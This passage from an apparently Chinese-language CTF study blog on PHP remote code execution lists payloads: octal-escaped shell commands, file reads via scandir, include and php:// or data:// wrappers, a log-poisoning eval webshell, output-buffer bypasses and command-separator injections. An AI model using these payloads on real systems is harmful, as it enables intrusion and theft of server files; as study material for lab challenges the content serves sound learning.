+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=$<span class="string">&#x27;\154\163&#x27;</span>      ls</span><br><span class="line"></span><br><span class="line">?c=$<span class="string">&#x27;\143\141\164&#x27;</span>%<span class="number">20</span>*     cat *</span><br><span class="line"></span><br><span class="line">?c=$<span class="string">&#x27;\164\141\143&#x27;</span> $<span class="string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span>      tac flag.php</span><br></pre></td></tr></table></figure>
+
+<p>可以使用python脚本来实现八进制ASCII码的编码与解码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode_to_octal</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将每个字符转换为其ASCII码的八进制表示</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">input_string = <span class="string">&quot;cat&quot;</span></span><br><span class="line">encoded_string = encode_to_octal(input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded: <span class="subst">&#123;encoded_string&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_from_octal</span>(<span class="params">octal_string</span>):</span><br><span class="line">    <span class="comment"># 分割八进制字符串，并将每个八进制值转换为字符</span></span><br><span class="line">    characters = octal_string.split(<span class="string">&#x27;\\&#x27;</span>)[<span class="number">1</span>:]  <span class="comment"># 去掉空字符串部分</span></span><br><span class="line">    decoded_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(c), <span class="number">8</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> characters)</span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">octal_string = <span class="string">&quot;\\143\\141\\164&quot;</span></span><br><span class="line">decoded_string = decode_from_octal(octal_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded: <span class="subst">&#123;decoded_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="七-命令执行函数过滤"><a href="#七-命令执行函数过滤" class="headerlink" title="七. 命令执行函数过滤"></a>七. 命令执行函数过滤</h1><p>题目只有一层<code>eval</code>​，而用于执行命令的函数都被过滤了，下面将介绍如何<strong>仅仅通过函数的结合，不利用任何命令</strong>，来实现目录与文件读取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;        </span><br><span class="line">	$c= $_POST[<span class="string">&#x27;c&#x27;</span>];           </span><br><span class="line">	eval($c);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	highlight_file(__FILE__);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-1-函数嵌套目录读取"><a href="#7-1-函数嵌套目录读取" class="headerlink" title="7.1 函数嵌套目录读取"></a>7.1 函数嵌套目录读取</h2><h3 id="7-1-1-自根目录向下读取目录"><a href="#7-1-1-自根目录向下读取目录" class="headerlink" title="7.1.1 自根目录向下读取目录"></a>7.1.1 自根目录向下读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var/www&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var/www/html&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这里也一样，不再列举</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">c=echo(implode(<span class="string">&#x27;--&#x27;</span>,scandir(<span class="string">&quot;/&quot;</span>)));</span><br><span class="line">c=echo json_encode(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-1-2-自当前目录向上读取目录"><a href="#7-1-2-自当前目录向上读取目录" class="headerlink" title="7.1.2 自当前目录向上读取目录"></a>7.1.2 自当前目录向上读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));  <span class="comment">// 读取当前目录</span></span><br><span class="line">c=print_r(scandir(dirname(__DIR__)));   <span class="comment">// 读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__FILE__))));<span class="comment">//读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__DIR__))));<span class="comment">//读取上上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​<code>dirname()</code>​ 用于获取路径的目录部分。<code>dirname(&#39;FILE&#39;);</code>​返回 ‘.’</li>
+<li>​<code>scandir()</code>​ 列出指定目录中的文件和目录，返回一个数组</li>
+<li>​<code>print_r()</code>​ 输出变量的易读信息，适合用于调试和查看数组内容</li>
+<li>​<code>__FILE__</code>​ <code>__DIR__</code>​是php中的魔术方法，可以用于获取当前目录与上级目录，通过迭代<code>dirname</code>​函数就能实现目录遍历<br>输出：<code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )</code>​<br>这里也一样，不再列举</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br><span class="line">c=var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br><span class="line">c=echo(implode(<span class="string">&#x27;--&#x27;</span>,scandir(dirname(dirname(dirname(dirname(__DIR__)))))));</span><br><span class="line">c=echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>
+
+<p>还可以用glob函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(glob(<span class="string">&#x27;*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../../*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../../../*&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-2-include函数文件读取"><a href="#7-2-include函数文件读取" class="headerlink" title="7.2 include函数文件读取"></a>7.2 include函数文件读取</h2><h3 id="7-2-1-直接包含输出文件"><a href="#7-2-1-直接包含输出文件" class="headerlink" title="7.2.1 直接包含输出文件"></a>7.2.1 直接包含输出文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=include(<span class="string">&quot;flag.php&quot;</span>);echo $flag;</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;../../../../../flag.txt&quot;</span>);echo $flag;</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;/flag.txt&quot;</span>);echo $flag;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-2-伪协议文件读取❓"><a href="#7-2-2-伪协议文件读取❓" class="headerlink" title="7.2.2 伪协议文件读取❓"></a>7.2.2 伪协议文件读取❓</h3><ol>
+<li>​<code>php://filter</code>​伪协议，它的传参伪协议打法更详细见[[#3.5.2 include函数]]</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=../../../../../flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>​<code>php://input</code>​伪协议</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[x]&amp;x=php:<span class="comment">//input</span></span><br><span class="line">post：&lt;?php system(<span class="string">&quot;ls -lah&quot;</span>)?&gt;</span><br><span class="line">      &lt;?php system(<span class="string">&quot;tac flag.php&quot;</span>)?&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>​<code>data://</code>​伪协议<br> 第二个是对php代码base64编码绕过<code>flag.php</code>​的过滤❓</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[x]&amp;x=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br><span class="line">c=include$_GET[x]&amp;x=data:<span class="comment">//text/plain;base64,data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==</span></span><br><span class="line">?c=data:<span class="comment">//text/plain,&lt;?=system(&quot;ls&quot;)?&gt;      //短标签绕过php过滤</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-3-日志包含"><a href="#7-2-3-日志包含" class="headerlink" title="7.2.3 日志包含"></a>7.2.3 日志包含</h3><p>日志的相对位置需要去遍历目录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include(../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>)</span><br><span class="line">UA:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-3-针对文件包含的过滤"><a href="#7-2-3-针对文件包含的过滤" class="headerlink" title="7.2.3 针对文件包含的过滤"></a>7.2.3 针对文件包含的过滤</h3><p>传参伪协议</p>
+<h2 id="7-3-highlight函数文件读取"><a href="#7-3-highlight函数文件读取" class="headerlink" title="7.3 highlight函数文件读取"></a>7.3 highlight函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//访问当前目录下的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">//通过相对路径访问上级目录的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"><span class="comment">//自根目录访问下级目录中的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-4-show-source函数文件读取"><a href="#7-4-show-source函数文件读取" class="headerlink" title="7.4 show_source函数文件读取"></a>7.4 show_source函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=show_source(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=show_source(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-5-readgzfile函数文件读取"><a href="#7-5-readgzfile函数文件读取" class="headerlink" title="7.5 readgzfile函数文件读取"></a>7.5 readgzfile函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=readgzfile(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=readgzfile(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-6-require-once函数文件读取"><a href="#7-6-require-once函数文件读取" class="headerlink" title="7.6 require_once函数文件读取"></a>7.6 require_once函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require_once(<span class="string">&#x27;/flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-7-函数嵌套文件枚举"><a href="#7-7-函数嵌套文件枚举" class="headerlink" title="7.7 函数嵌套文件枚举"></a>7.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-8-函数嵌套文件读取"><a href="#7-8-函数嵌套文件读取" class="headerlink" title="7.8 函数嵌套文件读取"></a>7.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<p>还可以用下面的这个函数实现同样功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="八-缓冲区劫持"><a href="#八-缓冲区劫持" class="headerlink" title="八. 缓冲区劫持"></a>八. 缓冲区劫持</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们利用函数与命令对目录与文件进行读取时，获得的内容会被输出到缓冲区，但并没有立即发送到浏览器。<br>而本段代码中<code>ob_get_contents()</code>​ 获取当前输出缓冲区的内容（如果有的话），然后通过 <code>ob_end_clean()</code>​ 清空缓冲区。这些代码意味着，如果 PHP 代码执行过程中有任何输出，它将被捕获到变量 <code>$s</code>​ 中。然后通过对<code>$s</code>​的正则匹配将输出全部替换为<code>?</code>​，使我们无法获得flag。</p>
+<h2 id="8-1-提前送出缓冲区"><a href="#8-1-提前送出缓冲区" class="headerlink" title="8.1 提前送出缓冲区"></a>8.1 提前送出缓冲区</h2><p>​<code>ob_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，但它并不会改变缓冲区中的内容。<br>​<code>ob_end_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，并清空缓冲区的内容。<br>利用这两个函数，可以在执行后续缓冲区操作前提前把内容输出<br>(这里的&#x2F;flag.txt是在根目录下的文件)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(glob(<span class="string">&#x27;*&#x27;</span>));ob_flush();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));ob_flush();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);ob_flush();</span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);ob_end_flush();</span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);ob_flush();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-2-提前终止程序"><a href="#8-2-提前终止程序" class="headerlink" title="8.2 提前终止程序"></a>8.2 提前终止程序</h2><p>如果在脚本结束时（比如在 <code>exit()</code>​ <code>die()</code>​被调用时），输出缓冲区中还有未输出的内容，PHP 会自动刷新这些内容并将其输出到浏览器。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="built_in">exit</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));die();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="built_in">exit</span>();</span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);die();</span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);die();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h1 id="九-命令分隔符"><a href="#九-命令分隔符" class="headerlink" title="九. 命令分隔符"></a>九. 命令分隔符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    </span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里解释一下这个</p>
+<ul>
+<li><p>​<code>&gt;/dev/null 2&gt;&amp;1</code>​ 是一个 Linux Shell 重定向操作：</p>
+<ul>
+<li>​<code>&gt;/dev/null</code>​：将标准输出重定向到 <code>/dev/null</code>​，相当于丢弃输出。</li>
+<li>​<code>2&gt;&amp;1</code>​：将标准错误（<code>2</code>​）重定向到标准输出（<code>1</code>​），也一起丢弃。</li>
+</ul>
+</li>
+<li><p>这意味着任何命令的输出（包括结果与报错）都不会显示。</p>
+</li>
+</ul>
+<h2 id="9-1-​-​-​-​-0a​命令分隔"><a href="#9-1-​-​-​-​-0a​命令分隔" class="headerlink" title="9.1 ;​,||​,&amp;​,&amp;&amp;​ %0a​命令分隔"></a>9.1 <code>;</code>​,<code>||</code>​,<code>&amp;</code>​,<code>&amp;&amp;</code>​ <code>%0a</code>​命令分隔</h2><p>先来看一下这几个字符的作用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; <span class="comment">//分号，前面的命令被执行，后面的命令和&gt;/dev/null 2&gt;&amp;1拼接被丢弃  </span></span><br><span class="line">| <span class="comment">//只执行后面那条命令  </span></span><br><span class="line">|| <span class="comment">//只执行前面那条命令  </span></span><br><span class="line">&amp; <span class="comment">//两条命令分别执行  </span></span><br><span class="line">&amp;&amp; <span class="comment">//仅当前一条命令成功执行后才执行下一条命令</span></span><br><span class="line">%<span class="number">0</span>a <span class="comment">//在URL编码中代表换行符，可以分隔或中断正常的指令</span></span><br></pre></td></tr></table></figure>
+
+<p>于是构造以下Payloads。需要注意的是<code>&amp;</code>​ 在 <strong>URL</strong> 中是一个保留字符，其作用是分隔多个参数，因此不能直接用 <code>&amp;</code>​ 而必须用 <code>%26</code>​。此处仅示例最基础命令，其他命令同理</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;ls</span><br><span class="line">?c=tac flag.php;ls</span><br><span class="line"></span><br><span class="line">?c=ls||</span><br><span class="line">?c=tac flag.php||  </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">26</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>  </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">26</span>%<span class="number">26</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">0</span>A</span><br><span class="line">?c=tac flag.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmawal1io000ybo7kbayw2tqc" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" 